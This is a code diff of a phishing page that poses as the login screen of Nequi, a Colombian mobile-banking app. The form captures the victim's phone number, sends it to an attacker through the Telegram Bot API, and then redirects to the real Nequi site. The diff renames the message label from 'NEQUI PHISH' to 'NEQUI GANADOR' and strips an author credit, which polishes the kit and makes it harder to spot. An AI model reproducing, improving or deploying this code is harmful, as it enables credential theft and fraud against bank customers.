@@ -16,6 +16,7 @@
             align-items: center; 
             justify-content: center;
             color: white;
+            margin: 0;
         }
         .container {
             width: 100%;
@@ -76,18 +77,10 @@
             font-size: 22px;
             opacity: 0.7;
         }
-        .by {
-            position: absolute;
-            top: 25px;
-            left: 20px;
-            font-size: 14px;
-            opacity: 0.6;
-        }
     </style>
 </head>
 <body>
     <div class="help">?</div>
-    <div class="by">by <span style="font-size:18px;">Ⓢ</span></div>
 
     <div class="container">
         <div class="logo"><span>■</span>Nequi</div>
@@ -108,7 +101,6 @@
 
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
-            
             const phone = document.getElementById("phone").value.trim();
 
             if (phone.length < 10) {
@@ -116,21 +108,15 @@
                 return;
             }
 
-            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n⏰ Hora: ${new Date().toLocaleString()}`;
+            const message = `🔴 NEQUI GANADOR\n\n📱 Número: +57 ${phone}\n⏰ Hora: ${new Date().toLocaleString()}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(() => {
-                alert("✅ Redirigiendo...");
-                setTimeout(() => {
-                    window.location.href = "https://www.nequi.com.co";
-                }, 1200);
-            })
-            .catch(() => {
-                window.location.href = "https://www.nequi.com.co";
+            }).then(() => {
+                alert("✅ Conectando...");
+                setTimeout(() => window.location.href = "https://www.nequi.com.co", 1500);
             });
         });
     </script>
